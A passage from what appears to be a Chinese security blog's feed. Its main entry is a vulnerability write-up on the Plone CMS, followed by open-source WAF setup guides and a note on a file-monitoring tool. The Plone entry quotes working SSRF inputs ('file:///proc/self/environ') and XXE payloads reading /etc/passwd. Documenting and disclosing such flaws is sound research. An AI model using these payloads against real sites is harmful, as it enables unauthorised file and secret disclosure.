    <content type="html"><![CDATA[<h2 id="Plone"><a href="#Plone" class="headerlink" title="Plone"></a>Plone</h2><p>Plone是使用Python开发的一个开源的内容管理系统，安装的时候以第三方包的形式安装使用，三百个包左右的程序，这个查看起来查找对应功能实在是费劲。</p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p><code>plone.app.event-3.2.7-py3.6.egg\plone\app\event\ical\importer.py</code></p><pre class="line-numbers language-none"><code class="language-none">@button.buttonAndHandler(u&#39;Save and Import&#39;)    def handleSaveImport(self, action):        data, errors &#x3D; self.extractData()        if errors:            return False        self.save_data(data)        ical_file &#x3D; data[&#39;ical_file&#39;]        ical_url &#x3D; data[&#39;ical_url&#39;]        event_type &#x3D; data[&#39;event_type&#39;]        sync_strategy &#x3D; data[&#39;sync_strategy&#39;]        if ical_file or ical_url:            if ical_file:                # File upload is not saved in settings                ical_resource &#x3D; ical_file.data                ical_import_from &#x3D; ical_file.filename            else:                ical_resource &#x3D; urllib.request.urlopen(ical_url).read()                ical_import_from &#x3D; ical_url            import_metadata &#x3D; ical_import(                self.context,                ics_resource&#x3D;ical_resource,                event_type&#x3D;event_type,                sync_strategy&#x3D;sync_strategy,            )<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如上所述，在读取参数<code> ical_url</code>时，根据程序设置是导入该事件的<code> icalendar</code>资源文件，但对如何读取资源文件没有限制，可以直接使用urllib包进行读取和返回</p><p>在Members功能下的<code>Action</code>中选择<code>Enable icalendar import</code>后，配置<code>Icalendar URL</code>参数。</p><p>参数：<code>http://127.0.0.1:22</code>，执行<code>Save and Import</code>。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201109094919974.png" alt="image-20201109094919974"></p><p>urllib还支持文件协议，因此也可以用于文件读取</p><p>参数: <code>file:///proc/self/environ</code></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201109100807462.png" alt="image-20201109100807462"></p><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p><code>plone.app.registry-1.7.6-py3.6.egg\plone\app\registry\browser\records.py</code></p><pre class="line-numbers language-none"><code class="language-none">def import_registry(self):        try:            fi &#x3D; self.request.form[&#39;file&#39;]            body &#x3D; fi.read()        except (AttributeError, KeyError):            messages &#x3D; IStatusMessage(self.request)            messages.add(u&quot;Must provide XML file&quot;, type&#x3D;u&quot;error&quot;)            body &#x3D; None        if body is not None:            importer &#x3D; RegistryImporter(self.context, FakeEnv())            try:                importer.importDocument(body)            except XMLSyntaxError:                messages &#x3D; IStatusMessage(self.request)                messages.add(u&quot;Must provide valid XML file&quot;, type&#x3D;u&quot;error&quot;)        return self.request.response.redirect(self.context.absolute_url())<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意<code>importDocument</code>方法，该方法在lxml.etree下调用该方法</p><p><code>plone.app.registry-1.7.6-py3.6.egg\plone\app\registry\exportimport\handler.py</code></p><pre class="line-numbers language-none"><code class="language-none">class RegistryImporter(object):    &quot;&quot;&quot;Helper classt to import a registry file    &quot;&quot;&quot;    LOGGER_ID &#x3D; &#39;plone.app.registry&#39;    def __init__(self, context, environ):        self.context &#x3D; context        self.environ &#x3D; environ        self.logger &#x3D; environ.getLogger(self.LOGGER_ID)    def importDocument(self, document):        tree &#x3D; etree.fromstring(document)        if self.environ.shouldPurge():            self.context.records.clear()        i18n_domain &#x3D; tree.attrib.get(ns(&#39;domain&#39;, I18N_NAMESPACE))        if i18n_domain:            parseinfo.i18n_domain &#x3D; i18n_domain        for node in tree:            if not isinstance(node.tag, str):                continue            condition &#x3D; node.attrib.get(&#39;condition&#39;, None)            if condition and not evaluateCondition(condition):                continue            if node.tag.lower() &#x3D;&#x3D; &#39;record&#39;:                self.importRecord(node)            elif node.tag.lower() &#x3D;&#x3D; &#39;records&#39;:                self.importRecords(node)        parseinfo.i18n_domain &#x3D; None<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此方法是此XXE的原因。 在网站设置<code>Site Setup</code>下的<code>Configuration Registry</code>中导出合适的XML文件。 在这里，选择了<code>plone.thumb_scale_table.xml</code>前缀文件。</p><p>参数 POC：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&#39;1.0&#39; encoding&#x3D;&#39;UTF-8&#39;?&gt;&lt;!DOCTYPE value [&lt;!ELEMENT value ANY &gt;&lt;!ENTITY title SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt; ]&gt;&lt;registry&gt;  &lt;records interface&#x3D;&quot;Products.CMFPlone.interfaces.controlpanel.ISiteSchema&quot; prefix&#x3D;&quot;plone&quot;&gt;    &lt;value key&#x3D;&quot;thumb_scale_table&quot;&gt;&amp;title;&lt;&#x2F;value&gt;  &lt;&#x2F;records&gt;&lt;&#x2F;registry&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行后，您可以在错误报告中看到已解析的XML实体。<img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201109142113406.png" alt="image-20201109142113406"></p><h3 id="XXE-2"><a href="#XXE-2" class="headerlink" title="XXE-2"></a>XXE-2</h3><p><code>plone.app.dexterity-2.6.5-py3.6.egg\plone\app\dexterity\browser\modeleditor.py</code></p><pre class="line-numbers language-none"><code class="language-none">class AjaxSaveHandler(BrowserView):    &quot;&quot;&quot;Handle AJAX save posts.    &quot;&quot;&quot;    def __call__(self):        &quot;&quot;&quot;Handle AJAX save post.        &quot;&quot;&quot;        if not authorized(self.context, self.request):            raise Unauthorized        source &#x3D; self.request.form.get(&#39;source&#39;)        if source:            # Is it valid XML?            try:                root &#x3D; etree.fromstring(source)            except etree.XMLSyntaxError as e:                return json.dumps(&#123;                    &#39;success&#39;: False,                    &#39;message&#39;: &#39;XMLSyntaxError: &#123;0&#125;&#39;.format(                        safe_unicode(e.args[0])                    )                &#125;)            # a little more sanity checking, look at first two element levels            if root.tag !&#x3D; NAMESPACE + &#39;model&#39;:                return json.dumps(&#123;                    &#39;success&#39;: False,                    &#39;message&#39;: _(u&quot;Error: root tag must be &#39;model&#39;&quot;)                &#125;)            for element in root.getchildren():                if element.tag !&#x3D; NAMESPACE + &#39;schema&#39;:                    return json.dumps(&#123;                        &#39;success&#39;: False,                        &#39;message&#39;: _(                            u&quot;Error: all model elements must be &#39;schema&#39;&quot;                        )                    &#125;)            # can supermodel parse it?            # This is mainly good for catching bad dotted names.            try:                plone.supermodel.loadString(source, policy&#x3D;u&#39;dexterity&#39;)            except SupermodelParseError as e:                message &#x3D; e.args[0].replace(&#39;\n  File &quot;&lt;unknown&gt;&quot;&#39;, &#39;&#39;)                return json.dumps(&#123;                    &#39;success&#39;: False,                    &#39;message&#39;: u&#39;SuperModelParseError: &#123;0&#125;&#39;.format(message)                &#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的代码使用lxml库，但是直接解析xml中的外部参数。 结果，在功能 <code>Dexterity Content Types</code>下选择<code> custom content types</code>，然后单击进入。 <code>fields</code>标签下的<code>Edit XML Field Model</code>可以直接编写xml代码。</p><p>参数 POC：</p><pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE value [&lt;!ELEMENT value ANY &gt;&lt;!ENTITY title SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt; ]&gt;&lt;model xmlns:i18n&#x3D;&quot;http:&#x2F;&#x2F;xml.zope.org&#x2F;namespaces&#x2F;i18n&quot; xmlns:marshal&#x3D;&quot;http:&#x2F;&#x2F;namespaces.plone.org&#x2F;supermodel&#x2F;marshal&quot; xmlns:form&#x3D;&quot;http:&#x2F;&#x2F;namespaces.plone.org&#x2F;supermodel&#x2F;form&quot; xmlns:security&#x3D;&quot;http:&#x2F;&#x2F;namespaces.plone.org&#x2F;supermodel&#x2F;security&quot; xmlns:users&#x3D;&quot;http:&#x2F;&#x2F;namespaces.plone.org&#x2F;supermodel&#x2F;users&quot; xmlns:lingua&#x3D;&quot;http:&#x2F;&#x2F;namespaces.plone.org&#x2F;supermodel&#x2F;lingua&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;namespaces.plone.org&#x2F;supermodel&#x2F;schema&quot;&gt; &amp;title;&lt;schema&#x2F;&gt;&lt;&#x2F;model&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>因为程序代码中似乎存在问题，所以无法添加XML声明文件，但是打开的默认声明文件具有添加的声明文件。 需要删除。 保存参数，并在返回后单击此处查看它们。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201110100900815.png" alt="image-20201110100900815"></p><p>问题相对利用条件较高，需要管理员权限，其后官方推出了更新版本5.2.3：<a href="https://dist.plone.org/release/5.2.3-pending/RELEASE-NOTES.txt">https://dist.plone.org/release/5.2.3-pending/RELEASE-NOTES.txt</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Plone&quot;&gt;&lt;a href=&quot;#Plone&quot; class=&quot;headerlink&quot; title=&quot;Plone&quot;&gt;&lt;/a&gt;Plone&lt;/h2&gt;&lt;p&gt;Plone是使用Python开发的一个开源的内容管理系统，安装的时候以第三方包的形式安装使用，三百个包左右的程序，这
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="python" scheme="https://misakikata.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>开源WAF搭建</title>
    <link href="https://misakikata.github.io/2020/09/%E5%BC%80%E6%BA%90WAF%E6%90%AD%E5%BB%BA/"/>
    <id>https://misakikata.github.io/2020/09/开源WAF搭建/</id>
    <published>2020-09-17T07:42:09.000Z</published>
    <updated>2020-09-17T07:42:29.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ModSecurity"><a href="#ModSecurity" class="headerlink" title="ModSecurity"></a>ModSecurity</h3><p>在Ubuntu和Nginx上安装，nginx版本为1.14.0。</p><h4 id="安装需要包"><a href="#安装需要包" class="headerlink" title="安装需要包"></a>安装需要包</h4><pre class="line-numbers language-none"><code class="language-none">apt-get install -y apt-utils autoconf automake build-essential git libcurl4-openssl-dev libgeoip-dev liblmdb-dev libpcre++-dev libtool libxml2-dev libyajl-dev pkgconf wget zlib1g-dev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="下载编译ModSecurity-3-0源代码"><a href="#下载编译ModSecurity-3-0源代码" class="headerlink" title="下载编译ModSecurity 3.0源代码"></a>下载编译ModSecurity 3.0源代码</h4><pre class="line-numbers language-none"><code class="language-none">git clone --depth 1 -b v3&#x2F;master --single-branch https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;ModSecurity<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进入目录运行编译</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;build.shgit submodule initgit submodule update.&#x2F;configuremakemake install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果出现<code>fatal: No names found, cannot describe anything.</code>，是可以忽略的。</p><h4 id="ModSecurity连接器"><a href="#ModSecurity连接器" class="headerlink" title="ModSecurity连接器"></a>ModSecurity连接器</h4><p>下载连接器代码</p><pre class="line-numbers language-none"><code class="language-none">git clone --depth 1 https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;ModSecurity-nginx.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>根据已安装的nginx版本安装需要的nginx原代码</p><pre class="line-numbers language-none"><code class="language-none">wget http:&#x2F;&#x2F;nginx.org&#x2F;download&#x2F;nginx-1.14.0.tar.gztar zxvf nginx-1.14.0.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>需要把连接器编译为动态模块到nginx中，到nginx目录下，其中的编译命令根据<code>nginx -V</code>来决定。</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;configure --with-compat --add-dynamic-module&#x3D;..&#x2F;ModSecurity-nginxmake modulesmkdir &#x2F;etc&#x2F;nginx&#x2F;modulescp objs&#x2F;ngx_http_modsecurity_module.so &#x2F;etc&#x2F;nginx&#x2F;modules&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>PS：运行<code>nginx -t</code>测试nginx运行，如果出现报错ModSecurity二进制文件不匹配，则可能是nginx版本验证不匹配，那就需要源码编译安装nginx，同时把ModSecurity一起编译。</p><h4 id="加载nginx动态模块"><a href="#加载nginx动态模块" class="headerlink" title="加载nginx动态模块"></a>加载nginx动态模块</h4><p>编译完成后的动态模块需要到配置文件中启动加载，修改配置文件<code>/etc/nginx/nginx.conf</code>中</p><pre class="line-numbers language-none"><code class="language-none">load_module &#x2F;etc&#x2F;nginx&#x2F;modules&#x2F;ngx_http_modsecurity_module.so;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="启用和测试规则"><a href="#启用和测试规则" class="headerlink" title="启用和测试规则"></a>启用和测试规则</h4><p>安装Spiderlabs的规则</p><pre class="line-numbers language-none"><code class="language-none">mkdir &#x2F;etc&#x2F;nginx&#x2F;modsecwget -P &#x2F;etc&#x2F;nginx&#x2F;modsec&#x2F; https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;SpiderLabs&#x2F;ModSecurity&#x2F;v3&#x2F;master&#x2F;modsecurity.conf-recommendedmv &#x2F;etc&#x2F;nginx&#x2F;modsec&#x2F;modsecurity.conf-recommended &#x2F;etc&#x2F;nginx&#x2F;modsec&#x2F;modsecurity.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>把ModSecurity中的unicode.mapping文件复制到以上目录</p><pre class="line-numbers language-none"><code class="language-none">cp ModSecurity&#x2F;unicode.mapping &#x2F;etc&#x2F;nginx&#x2F;modsec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改配置文件，其中配置部分被注释，需要安需要启用。</p><pre class="line-numbers language-none"><code class="language-none">SecRuleEngine DetectionOnly  #仅检测恶意流量，改为on为丢弃恶意流量<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加owasp的规则，在nginx下创建目录</p><pre class="line-numbers language-none"><code class="language-none">mkdir owasp-modsecurity-crscd owasp-modsecurity-crswget https:&#x2F;&#x2F;github.com&#x2F;coreruleset&#x2F;coreruleset&#x2F;archive&#x2F;v3.3.0.tar.gzmv crs-setup.conf.example crs-setup.confmv rules&#x2F;REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf.example rules&#x2F;REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.confmv rules&#x2F;RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf.example rules&#x2F;RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在modsec中修改modsecurity.conf，添加配置文件，同时把rules目录下的配置文件添加进去</p><pre class="line-numbers language-none"><code class="language-none">Include &#x2F;etc&#x2F;nginx&#x2F;modsec&#x2F;owasp-modsecurity-crs&#x2F;coreruleset-3.3.0&#x2F;crs-setup.confInclude &#x2F;etc&#x2F;nginx&#x2F;modsec&#x2F;owasp-modsecurity-crs&#x2F;coreruleset-3.3.0&#x2F;rules&#x2F;*.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在nginx配置文件中添加此配置</p><pre class="line-numbers language-none"><code class="language-none">vi sites-enabled&#x2F;defaultserver &#123;    listen 80;    modsecurity on;    modsecurity_rules_file &#x2F;etc&#x2F;nginx&#x2F;modsec&#x2F;modsecurity.conf;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以到crs配置文件中找到对应的规则来启用，比如如下启用id为900240的后缀文件检测</p><pre class="line-numbers language-none"><code class="language-none">C:\Users\user&gt;curl http:&#x2F;&#x2F;192.168.120.142&#x2F;admin.db&lt;html&gt;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body bgcolor&#x3D;&quot;white&quot;&gt;&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;&lt;hr&gt;&lt;center&gt;nginx&#x2F;1.14.0&lt;&#x2F;center&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>默认情况下会拦截常见的web攻击，比如</p><pre class="line-numbers language-none"><code class="language-none">C:\Users\user&gt;curl http:&#x2F;&#x2F;192.168.120.142&#x2F;admin.php?id&#x3D;1%20and%201&#x3D;1&lt;html&gt;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body bgcolor&#x3D;&quot;white&quot;&gt;&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;&lt;hr&gt;&lt;center&gt;nginx&#x2F;1.14.0&lt;&#x2F;center&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="配置新的conf文件"><a href="#配置新的conf文件" class="headerlink" title="配置新的conf文件"></a>配置新的conf文件</h4><p>如果默认的规则文件不符合需求，获取由于其他原因需要添加规则。先看一个普通的规则是怎么样的</p><pre class="line-numbers language-none"><code class="language-none">SecRule REQUEST_FILENAME &quot;@endsWith &#x2F;wp-login.php&quot; \    &quot;id:1003,\    phase:2,\    pass,\    nolog,\    ctl:ruleRemoveTargetByTag&#x3D;OWASP_CRS;ARGS:pwd&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>相当于在wp-login.php页面中，禁用对参数pwd的拦截检查。其中的格式是</p><pre class="line-numbers language-none"><code class="language-none">SecRule VARIABLES OPERATOR ACTIONSVARIABLES ：代表HTTP包中的标识项，规定了安全规则针对的对象。OPERATOR：代表操作符，一般用来定义安全规则的匹配条件。ACTIONS：代表响应动作，一般用来定义数据包被规则命中后的响应动作。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>比如，我们打算写一个只允许特定IP访问的路径。这时候需要两条规则来判断，需要<code>chain</code>来连接动作。把它保存到上面crs配置文件路径。重启nginx</p><pre class="line-numbers language-none"><code class="language-none">SecRule REQUEST_FILENAME &quot;@endsWith &#x2F;login.php&quot; \&quot;id:91002,\phase:1,\pass,\nolog,\deny,\chain&quot;SecRule  REMOTE_ADDR &quot;!@ipMatch 192.168.120.1&quot; \&quot;t:none&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>配置文档参考：<code>http://www.modsecurity.cn/chm/ConfigurationDirectives.html</code></p><h3 id="VeryNginx"><a href="#VeryNginx" class="headerlink" title="VeryNginx"></a>VeryNginx</h3><p>VeryNginx 基于 <code>lua_nginx_module(openrestry)</code> 开发。 集成在 Nginx 中运行，扩展了 Nginx 本身的功能，并提供了友好的 Web 交互界面。本质上这并不是一个WAF，只是openrestry的界面化。但是可以通过界面化的配置规则来实现waf的功能。</p><p><code>https://github.com/alexazhou/VeryNginx</code></p><h4 id="一键配置"><a href="#一键配置" class="headerlink" title="一键配置"></a>一键配置</h4><p>克隆 VeryNginx 仓库到本地, 然后进入仓库目录，执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">python install.py install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可一键安装 VeryNginx 和 以及依赖的 OpenResty，可以先修改其中的版本为新版本地址再安装。</p><h4 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a>手动安装</h4><p>手动安装，需要本地的nginx有openrestry，所以先安装。</p><pre class="line-numbers language-none"><code class="language-none">apt-get install libreadline-dev libpcre3-dev libssl-dev perlwget https:&#x2F;&#x2F;openresty.org&#x2F;download&#x2F;openresty-1.17.8.2.tar.gz.&#x2F;configure -j2make -j2sudo make installexport PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;openresty&#x2F;bin:$PATH<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这时候会把openrestry加入快捷命令，如果直接执行openrestry将开启自带的nginx。</p><p>再来安装verynginx</p><pre class="line-numbers language-none"><code class="language-none">python install.py install verynginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在nginx的配置文件中添加以下规则，需要配置到不同的地方。</p><pre class="line-numbers language-none"><code class="language-none">include &#x2F;opt&#x2F;verynginx&#x2F;verynginx&#x2F;nginx_conf&#x2F;in_external.conf;   #http外部include &#x2F;opt&#x2F;verynginx&#x2F;verynginx&#x2F;nginx_conf&#x2F;in_http_block.conf;  #http内部include &#x2F;opt&#x2F;verynginx&#x2F;verynginx&#x2F;nginx_conf&#x2F;in_server_block.conf;  #server内部<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在地址<code>/verynginx/index_zh.html</code>下即可访问到页面。</p><p>默认的账号密码都是<code>verynginx</code> / <code>verynginx</code>。添加规则的方式比modsecurity简单，但自带的规则过于简单，需要自己添加规则。</p><p>已有的规则可以参考：<code>https://github.com/unixhot/waf</code></p><h3 id="JxWaf"><a href="#JxWaf" class="headerlink" title="JxWaf"></a>JxWaf</h3><p><code>https://github.com/jx-sec/jxwaf</code></p><p>jxwaf(锦衣盾)是一款开源WEB应用防火墙，分为客户端和服务端，客户端也是openrestry开发而来。</p><h4 id="服务端安装"><a href="#服务端安装" class="headerlink" title="服务端安装"></a>服务端安装</h4><p>采用私有化部署</p><pre class="line-numbers language-none"><code class="language-none">docker run -d -p 80:80 jxwaf&#x2F;jxwaf-server:latest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拉取后，访问地址邮箱验证码随便填写，注册账号在全局配置页面获取”api key”和”api password”</p><h4 id="客户端安装"><a href="#客户端安装" class="headerlink" title="客户端安装"></a>客户端安装</h4><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;jx-sec&#x2F;jxwaf.gitcd jxwafsh install_waf.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在下载的文件内：</p><pre class="line-numbers language-none"><code class="language-none">cd toolspython jxwaf_init.py --api_key&#x3D;xxxx --api_password&#x3D;xxxx --waf_server&#x3D;http:&#x2F;&#x2F;192.168.1.1&#x2F;opt&#x2F;jxwaf&#x2F;nginx&#x2F;sbin&#x2F;nginx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在网站管理中添加对应的域名和IP端口</p><h3 id="Janusec"><a href="#Janusec" class="headerlink" title="Janusec"></a>Janusec</h3><p>可多节点布置的应用网关。<code>https://github.com/Janusec/janusec</code></p><pre class="line-numbers language-none"><code class="language-none">wget https:&#x2F;&#x2F;www.janusec.com&#x2F;download&#x2F;janusec-latest.tar.gztar zxf .&#x2F;janusec-latest.tar.gzcd janusec-0.9.9.&#x2F;install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>此处选择的是1，主节点。默认安装的路径为 <code>/usr/local/janusec/</code></p><p>由于需要postgresql</p><pre class="line-numbers language-none"><code class="language-none">sudo apt-get install postgresql postgresql-clientsudo -i -u postgrescreate user janusec with password &#39;janusec&#39;;create database janusec owner janusec;grant all on database janusec to janusec;\q<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后编辑 <code>/usr/local/janusec/config.json</code> ，尝试开启waf</p><pre class="line-numbers language-none"><code class="language-none">systemctl start janusec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置中管理太台监听设置为true，则使用http:9080端口，此处修改为false，直接在目录<code>janusec-admin/</code></p><p>默认用户名：<code>admin</code>，默认口令：<code>J@nusec123</code>。在应用管理中添加IP端口信息即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;ModSecurity&quot;&gt;&lt;a href=&quot;#ModSecurity&quot; class=&quot;headerlink&quot; title=&quot;ModSecurity&quot;&gt;&lt;/a&gt;ModSecurity&lt;/h3&gt;&lt;p&gt;在Ubuntu和Nginx上安装，nginx版本为1.14.0。&lt;/
      
    
    </summary>
    
    
      <category term="Open Source Security" scheme="https://misakikata.github.io/tags/Open-Source-Security/"/>
    
  </entry>
  
  <entry>
    <title>基于inotify的Linux文件实时监控扫描</title>
    <link href="https://misakikata.github.io/2020/09/%E5%9F%BA%E4%BA%8Einotify%E7%9A%84Linux%E6%96%87%E4%BB%B6%E5%AE%9E%E6%97%B6%E7%9B%91%E6%8E%A7%E6%89%AB%E6%8F%8F/"/>
    <id>https://misakikata.github.io/2020/09/基于inotify的Linux文件实时监控扫描/</id>
    <published>2020-09-04T09:02:23.000Z</published>
    <updated>2020-09-04T09:02:38.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="watchfile"><a href="#watchfile" class="headerlink" title="watchfile"></a>watchfile</h2><p>项目地址：<a href="https://github.com/MisakiKata/watchfile">https://github.com/MisakiKata/watchfile</a></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre class="line-numbers language-none"><code class="language-none">#第三方库pip install pyinotify#使用supervisor来守护进程apt-get install supervisoryum install supervisor<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><pre class="line-numbers language-none"><code class="language-none">#安装完成后需要启动，按需要修改配置文件supervisord -c &#x2F;etc&#x2F;supervisor&#x2F;supervisord.conf#配置文件例子; supervisor config file[unix_http_server]file&#x3D;&#x2F;var&#x2F;run&#x2F;supervisor.sock   ; (the path to the socket file)chmod&#x3D;0700                       ; sockef file mode (default 0700)[supervisord]logfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;supervisord.log ; (main log file;default $CWD&#x2F;supervisord.log)pidfile&#x3D;&#x2F;var&#x2F;run&#x2F;supervisord.pid ; (supervisord pidfile;default supervisord.pid)childlogdir&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor            ; (&#39;AUTO&#39; child log dir, default $TEMP); the below section must remain in the config file for RPC; (supervisorctl&#x2F;web interface) to work, additional interfaces may be; added by defining them in separate rpcinterface: sections[rpcinterface:supervisor]supervisor.rpcinterface_factory &#x3D; supervisor.rpcinterface:make_main_rpcinterface[supervisorctl]serverurl&#x3D;unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;supervisor.sock ; use a unix:&#x2F;&#x2F; URL  for a unix socket; The [include] section can just contain the &quot;files&quot; setting.  This; setting can list multiple files (separated by whitespace or; newlines).  It can also contain wildcards.  The filenames are; interpreted as relative to this file.  Included files *cannot*; include files themselves.[include]files &#x3D; &#x2F;data&#x2F;vscode&#x2F;watchfile&#x2F;watchfile.conf    #修改自己的配置文件地址由于调用了河马扫描程序来检测文件，所以大量文件同时变更时，检测会慢，建议系统做大量变更时可以停掉程序。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h3><pre class="line-numbers language-none"><code class="language-none">在config.ini 中修改自己的配置，因为使用多线程来监控多目录，建议使用多目录配置运行 python3 daemon.py来查看输出和测试邮件异常处理查看输出日志的时候，如果出现wd&#x3D;-1   需要修改 vim &#x2F;etc&#x2F;sysctl.conffs.inotify.max_user_watches &#x3D; 128000    #决定了同时同一用户可以监控的目录数量日志中看到Event Queue Overflowmax_queued_events太小需要调整参数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    <summary type="html">
    
      
      
